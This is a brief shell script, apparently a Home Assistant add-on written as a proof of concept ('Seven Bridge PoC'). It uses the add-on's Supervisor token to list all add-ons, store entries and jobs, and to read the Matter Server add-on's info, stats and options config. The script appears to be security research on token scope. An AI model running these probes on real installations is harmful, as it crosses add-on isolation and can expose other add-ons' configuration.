#!/usr/bin/with-contenv bashio
set -euo pipefail

echo "=== Seven Bridge PoC starting ==="

if [ -z "${SUPERVISOR_TOKEN:-}" ]; then
  echo "ERROR: SUPERVISOR_TOKEN is empty"
  sleep infinity
fi

echo "SUPERVISOR_TOKEN length: ${#SUPERVISOR_TOKEN}"

call() {
  local method="$1"
  local url="$2"
  local body="${3:-}"

  echo
  echo "=================================================================="
  echo ">>> ${method} ${url}"
  echo "=================================================================="

  if [ -n "${body}" ]; then
    curl -i -sS -X "${method}" \
      -H "Authorization: Bearer ${SUPERVISOR_TOKEN}" \
      -H "Content-Type: application/json" \
      -d "${body}" \
      "${url}" || true
  else
    curl -i -sS -X "${method}" \
      -H "Authorization: Bearer ${SUPERVISOR_TOKEN}" \
      "${url}" || true
  fi
  echo
}

# 1) 基础信息
call GET "http://supervisor/info"

# 2) 全局 add-on 枚举（最关键）
call GET "http://supervisor/addons"

# 3) Store add-on 枚举（最关键）
call GET "http://supervisor/store/addons"

# 4) 后台 jobs
call GET "http://supervisor/jobs/info"

# 5) 用 Matter Server 作为已知样本做详情读取
call GET "http://supervisor/addons/core_matter_server/info"

# 6) Stats 读取
call GET "http://supervisor/addons/core_matter_server/stats"

# 7) options config 读取（如果支持）
call GET "http://supervisor/addons/core_matter_server/options/config"

# 8) validate 试探（只校验，不落盘）
call POST "http://supervisor/addons/core_matter_server/options/validate" \
'{"options":{"log_level":"info","log_level_sdk":"error","beta":false,"enable_test_net_dcl":false}}'

echo
echo "=== Validation finished. Container will now stay alive. ==="
sleep infinity
